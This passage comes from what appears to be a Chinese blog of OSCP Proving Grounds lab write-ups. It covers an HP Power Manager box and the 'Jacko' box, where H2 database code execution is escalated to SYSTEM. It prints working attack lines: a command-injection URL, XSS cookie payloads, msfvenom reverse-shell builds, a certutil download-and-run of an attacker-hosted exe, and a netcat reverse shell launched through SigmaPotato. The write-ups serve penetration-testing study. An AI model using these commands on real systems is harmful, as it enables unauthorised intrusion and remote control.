/cgi-bin-sdb/dose.pl?daily&amp;somefile.txt&amp;|ls|<span class="punctuation">:</span> DailyDose <span class="number">1.1</span> is vulnerable to a directory traversal attack in the &#x27;list&#x27; parameter. See<span class="punctuation">:</span> OSVDB<span class="number">-2799</span></span><br><span class="line">    + /forum/memberlist.php?s=<span class="number">23</span>c37cf1af5d2ad05f49361b0407ad9e&amp;what=\<span class="string">&quot;&gt;\&quot;&lt;script&gt;javascript:alert(document.cookie)&lt;/script&gt;: Vbulletin 2.2.9 and below are vulnerable to Cross Site Scripting (XSS). See: OSVDB-3280</span></span><br><span class="line"><span class="string">    + /docs/&lt;script&gt;alert(&#x27;Vulnerable&#x27;);&lt;/script&gt;: Nokia Electronic Documentation is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0801</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 139 </span></span><br><span class="line"><span class="string">    [V] Trying to get NetBIOS names information, running command: nmblookup -s /tmp/tmpnxrjto4_ -A 192.168.197.45</span></span><br><span class="line"><span class="string">    [92m[+] Got domain/workgroup name: WORKGROUP[0m</span></span><br><span class="line"><span class="string">    [92m[+] Full NetBIOS names information:</span></span><br><span class="line"><span class="string">    - KEVIN           &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span></span><br><span class="line"><span class="string">    - WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span></span><br><span class="line"><span class="string">    - WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span></span><br><span class="line"><span class="string">    - KEVIN           &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span></span><br><span class="line"><span class="string">    - WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span></span><br><span class="line"><span class="string">    - ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span></span><br><span class="line"><span class="string">    - MAC Address = 00-50-56-AB-F9-35[0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 445</span></span><br><span class="line"><span class="string">[V] Trying to get NetBIOS names information, running command: nmblookup -s /tmp/tmpnxrjto4_ -A 192.168.197.45</span></span><br><span class="line"><span class="string">  SMB 1.0: true</span></span><br><span class="line"><span class="string">  SMB 2.02: true</span></span><br><span class="line"><span class="string">  SMB 2.1: true </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  smb-vuln-ms17-010: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2017-0143</span></span><br><span class="line"><span class="string">|     Risk factor: HIGH</span></span><br><span class="line"><span class="string">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span></span><br><span class="line"><span class="string">|        servers (ms17-010).</span></span><br><span class="line"><span class="string">|         </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 3389 </span></span><br><span class="line"><span class="string">    ms-wbt-server</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 3573</span></span><br><span class="line"><span class="string">    tag-ups-1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- udp 137</span></span><br><span class="line"><span class="string">    netbios-ns</span></span><br></pre></td></tr></table></figure>

<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><p>题目兔子洞较多</p>
<ol>
<li>smb 扫描可能有永恒之蓝漏洞，多次尝试未果</li>
<li>web</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> hp power manager     no rce</span><br><span class="line"><span class="number">2.</span> cyclade              no rce</span><br><span class="line"><span class="number">3.</span> dailyDose            rce 但是利用不成功  http<span class="punctuation">:</span><span class="comment">//192.168.197.45/cgi-bin/dose.pl?daily&amp;somefile.txt&amp;|whoami|</span></span><br><span class="line"><span class="number">4.</span> goahead web server   no rce</span><br></pre></td></tr></table></figure>

<ul>
<li>dailyDose 利用失败</li>
<li>cyclade 不是系统级的漏洞</li>
<li>goahead 版本位置，尝试两个rce exploit未果</li>
<li>hp power manager 无rce</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ss hp power manager</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                    |  Path</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Flying Dog Software Powerslave <span class="number">4.3</span> Portalmanager - &#x27;sql_id&#x27; Information Disclosure                                                | php/webapps/<span class="number">23163.</span>txt</span><br><span class="line">Hewlett-Packard (HP) Power Manager Administration - Remote Buffer Overflow (Metasploit)                                           | windows/remote/<span class="number">16785.</span>rb</span><br><span class="line">Hewlett-Packard (HP) Power Manager Administration Power Manager Administration - Universal Buffer Overflow                        | windows/remote/<span class="number">10099.</span>py</span><br><span class="line">HP Power Manager - &#x27;formExportDataLogs&#x27; Remote Buffer Overflow (Metasploit)                                                       | cgi/remote/<span class="number">18015.</span>rb</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes<span class="punctuation">:</span> No Results</span><br><span class="line">Papers<span class="punctuation">:</span> No Results</span><br></pre></td></tr></table></figure>

<p>看题解是利用缓冲区溢出漏洞</p>
<p>坏字符</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-127.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp -b <span class="string">&quot;\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a&quot;</span> LHOST=<span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span> LPORT=<span class="number">4444</span> -e x86/alpha_mixed -f c</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span> LPORT=<span class="number">4444</span> EXITFUNC=thread -b <span class="string">&quot;\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5&quot;</span> -e  x86/alpha_mixed -f python</span><br></pre></td></tr></table></figure>

<p>替换n00bnoob以下部分</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-126.png.png"></p>
<p>最后也没成功</p>
<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
<li>web 弱口令admin:admin进入能看到hp power manager 的版本号，没有第一时间搜索vulns, 心理过于依赖searchsploit了， 并且认为只有rce可以利用，需要积累经验</li>
<li>在看似可利用的点较多时，多次尝试失败导致逐渐不信任前面是不是操作有问题</li>
<li>看到用户名密码后应该搜索默认密码，而不是admin:admin手动撞大运</li>
</ol>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Jacko</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<h1 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">sudo autorecon <span class="number">192.168</span><span class="number">.197</span><span class="number">.66</span></span><br></pre></td></tr></table></figure>

<p><img data-src="https://thiiiiink.com/202508/asynccode-123.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">OS<span class="punctuation">:</span> Windows <span class="number">10</span><span class="punctuation">,</span> Windows Server <span class="number">2019</span><span class="punctuation">,</span> Windows Server <span class="number">2016</span></span><br><span class="line">OS version<span class="punctuation">:</span> &#x27;<span class="number">10.0</span>&#x27;</span><br><span class="line">OS release<span class="punctuation">:</span> &#x27;<span class="number">1903</span>&#x27;</span><br><span class="line">OS build<span class="punctuation">:</span> &#x27;<span class="number">18362</span>&#x27;</span><br><span class="line"></span><br><span class="line"><span class="number">-80</span></span><br><span class="line">    IIS <span class="number">10.0</span> </span><br><span class="line">    TITLE<span class="punctuation">:</span> H2 Database Engine</span><br><span class="line">- <span class="number">135</span></span><br><span class="line">    msrpc</span><br><span class="line">- <span class="number">139</span></span><br><span class="line">    netbios-ssn</span><br><span class="line">- <span class="number">445</span></span><br><span class="line">    SMB V2<span class="number">.02</span> <span class="number">2.1</span> <span class="number">3.0</span> <span class="number">3.1</span></span><br><span class="line">- <span class="number">5040</span></span><br><span class="line">    unknown</span><br><span class="line">- <span class="number">7680</span></span><br><span class="line">    tcpwrapped</span><br><span class="line">- <span class="number">8082</span></span><br><span class="line">    H2 database http console</span><br><span class="line">- <span class="number">9092</span></span><br><span class="line">    XmlIpcRegSvc</span><br><span class="line">- <span class="number">49</span>xxx</span><br><span class="line">    msrpc</span><br></pre></td></tr></table></figure>

<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><h2 id="smb-vuln"><a href="#smb-vuln" class="headerlink" title="smb-vuln"></a>smb-vuln</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">nmap <span class="string">&quot;--script=smb-vuln*&quot;</span> -p445 <span class="number">192.168</span><span class="number">.197</span><span class="number">.55</span> -Pn</span><br><span class="line">Starting Nmap <span class="number">7.94</span>SVN ( https<span class="punctuation">:</span><span class="comment">//nmap.org ) at 2025-02-06 19:49 CST</span></span><br><span class="line">Nmap scan report for <span class="number">192.168</span><span class="number">.197</span><span class="number">.55</span></span><br><span class="line">Host is up.</span><br><span class="line"></span><br><span class="line">PORT    STATE    SERVICE</span><br><span class="line"><span class="number">445</span>/tcp filtered microsoft-ds</span><br><span class="line"></span><br><span class="line">Nmap done<span class="punctuation">:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">2.23</span> seconds</span><br></pre></td></tr></table></figure>

<h2 id="web目录扫描"><a href="#web目录扫描" class="headerlink" title="web目录扫描"></a>web目录扫描</h2><p>80端口</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">gobuster dir -w /usr/share<span class="comment">//wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.197.66:80 -t 40</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3<span class="number">.6</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Url<span class="punctuation">:</span>                     http<span class="punctuation">:</span><span class="comment">//192.168.197.66:80</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Method<span class="punctuation">:</span>                  GET</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Threads<span class="punctuation">:</span>                 <span class="number">40</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Wordlist<span class="punctuation">:</span>                /usr/share<span class="comment">//wordlists/dirbuster/directory-list-2.3-medium.txt</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Negative Status codes<span class="punctuation">:</span>   <span class="number">404</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> User Agent<span class="punctuation">:</span>              gobuster/<span class="number">3.6</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Timeout<span class="punctuation">:</span>                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">155</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.197.66:80/images/]</span></span><br><span class="line">/help                 (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">153</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.197.66:80/help/]</span></span><br><span class="line">/html                 (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">153</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.197.66:80/html/]</span></span><br><span class="line">/Images               (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">155</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.197.66:80/Images/]</span></span><br><span class="line">/text                 (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">153</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.197.66:80/text/]</span></span><br><span class="line">/Help                 (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">153</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.197.66:80/Help/]</span></span><br><span class="line">/HTML                 (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">153</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.197.66:80/HTML/]</span></span><br><span class="line">/IMAGES               (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">155</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.197.66:80/IMAGES/]</span></span><br><span class="line">/Text                 (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">153</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.197.66:80/Text/]</span></span><br><span class="line">/Html                 (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">153</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.197.66:80/Html/]</span></span><br><span class="line">/javadoc              (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">156</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.197.66:80/javadoc/]</span></span><br><span class="line">/TEXT                 (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">153</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.197.66:80/TEXT/]</span></span><br><span class="line">/HELP                 (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">153</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.197.66:80/HELP/]</span></span><br><span class="line">Progress<span class="punctuation">:</span> <span class="number">220560</span> / <span class="number">220561</span> (<span class="number">100.00</span>%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<p><img data-src="https://thiiiiink.com/202508/asynccode-125.png.png"></p>
<p>8082端口</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">gobuster dir -w /usr/share<span class="comment">//wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.197.66:8082 -t 40</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3<span class="number">.6</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Url<span class="punctuation">:</span>                     http<span class="punctuation">:</span><span class="comment">//192.168.197.66:8082</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Method<span class="punctuation">:</span>                  GET</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Threads<span class="punctuation">:</span>                 <span class="number">40</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Wordlist<span class="punctuation">:</span>                /usr/share<span class="comment">//wordlists/dirbuster/directory-list-2.3-medium.txt</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Negative Status codes<span class="punctuation">:</span>   <span class="number">404</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> User Agent<span class="punctuation">:</span>              gobuster/<span class="number">3.6</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Timeout<span class="punctuation">:</span>                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Progress<span class="punctuation">:</span> <span class="number">220560</span> / <span class="number">220561</span> (<span class="number">100.00</span>%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<p>没有什么有用信息。<br>8082端口h2 database</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-124.png.png"></p>
<p>点击connect可以直接进入， 版本号1.4.199<br><img data-src="https://thiiiiink.com/202508/asynccode-122.png.png"><br>searchsploit搜索一下已知漏洞</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ss h2 database</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                    |  Path</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">H2 Database - &#x27;Alias&#x27; Arbitrary Code Execution                                                                                    | java/local/<span class="number">44422.</span>py</span><br><span class="line">H2 Database <span class="number">1.4</span><span class="number">.196</span> - Remote Code Execution                                                                                       | java/webapps/<span class="number">45506.</span>py</span><br><span class="line">H2 Database <span class="number">1.4</span><span class="number">.197</span> - Information Disclosure                                                                                      | linux/webapps/<span class="number">45105.</span>py</span><br><span class="line">H2 Database <span class="number">1.4</span><span class="number">.199</span> - JNI Code Execution                                                                                          | java/local/<span class="number">49384.</span>txt</span><br><span class="line">Oracle Database <span class="number">10</span> g - XML DB xdb.xdb_pitrig_pkg Package PITRIG_TRUNCATE Function Overflow                                        | multiple/remote/<span class="number">31010.</span>sql</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes<span class="punctuation">:</span> No Results</span><br><span class="line">Papers<span class="punctuation">:</span> No Results</span><br></pre></td></tr></table></figure>

<p>依次输入payload,成功执行命令，当前用户名为tony<br><img data-src="https://thiiiiink.com/202508/asynccode-121.png.png"></p>
<p>msfvenom生成反弹shell exe</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span> LPORT=<span class="number">4444</span> -f exe -o ~/Tools/windows/r.exe</span><br></pre></td></tr></table></figure>

<p>上传并执行， 上传 wget iwr 都无法执行，提示cannot find,使用certutil下载文件</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -f http<span class="punctuation">:</span><span class="comment">//192.168.45.189/r.exe C:\Users\tony\r2.exe</span></span><br><span class="line"></span><br><span class="line">CALL JNIScriptEngine_eval(&#x27;new java.util.Scanner(java.lang.Runtime.getRuntime().exec(<span class="string">&quot;C:\Users\tony\r2.exe&quot;</span>).getInputStream()).useDelimiter(<span class="string">&quot;\\Z&quot;</span>).next()&#x27;);</span><br></pre></td></tr></table></figure>

<p><img data-src="https://thiiiiink.com/202508/asynccode-125.png.png"></p>
<p>根据错误提示发现\被过滤了, 尝试url编码也无法执行。最后添加一个\后执行成功， 后来看官方walkthrough,使用的是 &#x2F; ,但是经过测试还是无法执行</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -f http<span class="punctuation">:</span><span class="comment">//192.168.45.189/r.exe C:\\Users\\tony\\r2.exe</span></span><br><span class="line"></span><br><span class="line">CALL JNIScriptEngine_eval(&#x27;new java.util.Scanner(java.lang.Runtime.getRuntime().exec(<span class="string">&quot;C:\\Users\\tony\\r2.exe&quot;</span>).getInputStream()).useDelimiter(<span class="string">&quot;\\Z&quot;</span>).next()&#x27;);</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">nc -nvlp <span class="number">4444</span></span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">4444</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.197</span><span class="number">.66</span><span class="punctuation">]</span> <span class="number">50325</span></span><br><span class="line">Microsoft Windows <span class="punctuation">[</span>Version <span class="number">10.0</span><span class="number">.18363</span><span class="number">.836</span><span class="punctuation">]</span></span><br><span class="line">(c) <span class="number">2019</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Program Files (x86)\H2\service&gt;cd /users/tony</span><br><span class="line">cd /users/tony</span><br></pre></td></tr></table></figure>

<p>遇到奇怪的问题，发现whoami, net user 命令都无法执行， 添加环境变量后仍无法执行</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">C<span class="punctuation">:</span>\Program Files (x86)&gt;whoami</span><br><span class="line">whoami</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Program Files (x86)&gt;tasklist</span><br><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Program Files (x86)&gt;set PATH=%PATH%;C<span class="punctuation">:</span>\windows\system32;C<span class="punctuation">:</span>\windows;C<span class="punctuation">:</span>\windows\System32\Wbem;C<span class="punctuation">:</span>\windows\System32\WindowsPowerShell\v1<span class="number">.0</span>\;C<span class="punctuation">:</span>\windows\System32\OpenSSH\;C<span class="punctuation">:</span>\Program Files\dotnet\</span><br><span class="line">set PATH=%PATH%;C<span class="punctuation">:</span>\windows\system32;C<span class="punctuation">:</span>\windows;C<span class="punctuation">:</span>\windows\System32\Wbem;C<span class="punctuation">:</span>\windows\System32\WindowsPowerShell\v1<span class="number">.0</span>\;C<span class="punctuation">:</span>\windows\System32\OpenSSH\;C<span class="punctuation">:</span>\Program Files\dotnet\</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Program Files (x86)&gt;whoami</span><br><span class="line">whoami</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Program Files (x86)&gt;^C</span><br></pre></td></tr></table></figure>

<h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><p>上传winPeas收集信息</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Current Token privileges</span><br><span class="line">�Check if you can escalate privilege using some enabled token https<span class="punctuation">:</span><span class="comment">//book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation</span></span><br><span class="line">    SeShutdownPrivilege<span class="punctuation">:</span> DISABLED</span><br><span class="line">    SeChangeNotifyPrivilege<span class="punctuation">:</span> SE_PRIVILEGE_ENABLED_BY_DEFAULT<span class="punctuation">,</span> SE_PRIVILEGE_ENABLED</span><br><span class="line">    SeUndockPrivilege<span class="punctuation">:</span> DISABLED</span><br><span class="line">    SeImpersonatePrivilege<span class="punctuation">:</span> SE_PRIVILEGE_ENABLED_BY_DEFAULT<span class="punctuation">,</span> SE_PRIVILEGE_ENABLED</span><br><span class="line">    SeCreateGlobalPrivilege<span class="punctuation">:</span> SE_PRIVILEGE_ENABLED_BY_DEFAULT<span class="punctuation">,</span> SE_PRIVILEGE_ENABLED</span><br><span class="line">    SeIncreaseWorkingSetPrivilege<span class="punctuation">:</span> DISABLED</span><br><span class="line">    SeTimeZonePrivilege<span class="punctuation">:</span> DISABLED</span><br></pre></td></tr></table></figure>

<p>上传 SweetPotato.exe 和 nc, 使用SweetPotato无法利用成功，并且shell会卡死，在medium上的wirteup, 使用godPotato也有卡死的问题</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">C<span class="punctuation">:</span>\Users\tony&gt;.\SweetPotato.exe -a <span class="string">&quot;whoami&quot;</span></span><br><span class="line">.\SweetPotato.exe -a <span class="string">&quot;whoami&quot;</span></span><br><span class="line">Modifying SweetPotato by Uknow to support webshell</span><br><span class="line">Github<span class="punctuation">:</span> https<span class="punctuation">:</span><span class="comment">//github.com/uknowsec/SweetPotato</span></span><br><span class="line">SweetPotato by @_EthicalChaos_</span><br><span class="line">  Orignal RottenPotato code and exploit by @foxglovesec</span><br><span class="line">  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery</span><br><span class="line">  PrintSpoofer discovery and original exploit by @itm4n</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Attempting NP impersonation using method PrintSpoofer to launch c<span class="punctuation">:</span>\Windows\System32\cmd.exe</span><br><span class="line">Can&#x27;t find endpoint for <span class="number">12345678</span><span class="number">-1234</span>-abcd-ef00<span class="number">-0123456789</span>ab <span class="number">1.0</span> with protocol sequence ncalrpc</span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span> No authenticated interception took place<span class="punctuation">,</span> exploit failed</span><br></pre></td></tr></table></figure>

<p>改用SigmaPotato利用成功，不过还是存在同样的问题whoami无法执行，不过算是拿到了flag</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">C<span class="punctuation">:</span>\Users\tony&gt;.\SigmaPotato <span class="string">&quot;.\nc 192.168.45.189 4443 -e cmd&quot;</span></span><br><span class="line">.\SigmaPotato <span class="string">&quot;.\nc 192.168.45.189 4443 -e cmd&quot;</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Starting Pipe Server...</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Created Pipe Name<span class="punctuation">:</span> \\.\pipe\SigmaPotato\pipe\epmapper</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Pipe Connected!</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Impersonated Client<span class="punctuation">:</span> NT AUTHORITY\NETWORK SERVICE</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Searching for System Token...</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> PID<span class="punctuation">:</span> <span class="number">788</span> | Token<span class="punctuation">:</span> <span class="number">0x772</span> | User<span class="punctuation">:</span> NT AUTHORITY\SYSTEM</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Found System Token<span class="punctuation">:</span> True</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Duplicating Token...</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> New Token Handle<span class="punctuation">:</span> <span class="number">948</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Current Command Length<span class="punctuation">:</span> <span class="number">31</span> characters</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Creating Process via &#x27;CreateProcessWithTokenW&#x27;</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Process Started with PID<span class="punctuation">:</span> <span class="number">2344</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">nc -nvlp <span class="number">4443</span></span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">4443</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.197</span><span class="number">.66</span><span class="punctuation">]</span> <span class="number">50405</span></span><br><span class="line">Microsoft Windows <span class="punctuation">[</span>Version <span class="number">10.0</span><span class="number">.18363</span><span class="number">.836</span><span class="punctuation">]</span></span><br><span class="line">(c) <span class="number">2019</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Windows\system32&gt;cd /users</span><br><span class="line">cd /users</span><br></pre></td></tr></table></figure>

<p>官方workThrough利用的是<a href="https://www.exploit-db.com/exploits/49382">CVE-2018-16156</a>， 不过PaperStream IP 进程有漏洞也太难发现了，winPeas也没有收集到这个漏洞，需要积累经验</p>
<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
<li>脑子要灵光，看到执行时\被过滤了，应该要想到下载的时候也需要加一个</li>
<li>提权时，不能只有之前学的东西，一味地翻笔记，创建backdoor用户，加入administrator, 添加到rdp组，一通操作下来发现连3389端口都没开放，不知道在干些什么，反弹shell只想着nc, msfvenom直接生成exe啊，直接用</li>
</ol>
]]></content>
      <categories>
